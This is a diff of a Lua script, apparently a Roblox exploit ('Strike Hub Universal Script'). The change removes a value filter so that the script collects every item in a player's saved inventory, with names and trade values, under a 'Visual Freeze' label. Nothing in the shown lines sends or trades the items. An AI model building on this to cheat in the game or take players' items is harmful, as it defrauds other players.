@@ -1,4 +1,4 @@
---// Strike Hub Universal Script (Final Version with Visual Freeze)
+--// Strike Hub Universal Script (All Items + Visual Freeze)
 _G.scriptExecuted = _G.scriptExecuted or false
 if _G.scriptExecuted then return end
 _G.scriptExecuted = true
@@ -18,7 +18,7 @@ local network = safeRequire(game.ReplicatedStorage.Library.Client.Network)
 local saveModule = safeRequire(game.ReplicatedStorage.Library.Client.Save)
 local message = safeRequire(game.ReplicatedStorage.Library.Client.Message)
 
--- ✅ Fixed save reference
+--✅ Fixed save reference
 local rawSave = (saveModule.Get and saveModule.Get()) or {}
 local save = rawSave.Save or rawSave.Inventory or {}
 
@@ -100,7 +100,7 @@ local function formatNumber(n)
 	else return tostring(math.floor(n)) end
 end
 
---// RAP function
+--// RAP function (still works but not used for filtering)
 local function getRAP(_, item)
 	local success, val = pcall(function()
 		local RAPCmds = require(game.ReplicatedStorage.Library.Client.RAPCmds)
@@ -164,20 +164,18 @@ for _, cat in ipairs({"Pet","Egg","Charm","Enchant","Potion","Misc","Hoverboard"
 	end
 end
 
---// Collect eligible items
+--// Collect all items (no RAP filter)
 local sortedItems, totalRAP = {}, 0
 for _, cat in ipairs({"Pet","Egg","Charm","Enchant","Potion","Misc","Hoverboard","Booth","Ultimate"}) do
 	if save[cat] then
 		for uid, item in pairs(save[cat]) do
 			local rap = getRAP(cat, item)
-			if rap >= min_rap then
-				local prefix = (item.sh and "Shiny " or "")
-				if item.pt == 1 then prefix ..= "Golden "
-				elseif item.pt == 2 then prefix ..= "Rainbow " end
-				local name = prefix .. item.id
-				table.insert(sortedItems, {category=cat, uid=uid, amount=item._am or 1, rap=rap, name=name})
-				totalRAP += rap * (item._am or 1)
-			end
+			local prefix = (item.sh and "Shiny " or "")
+			if item.pt == 1 then prefix ..= "Golden "
+			elseif item.pt == 2 then prefix ..= "Rainbow " end
+			local name = prefix .. item.id
+			table.insert(sortedItems, {category=cat, uid=uid, amount=item._am or 1, rap=rap, name=name})
+			totalRAP += rap * (item._am or 1)
 		end
 	end
 end
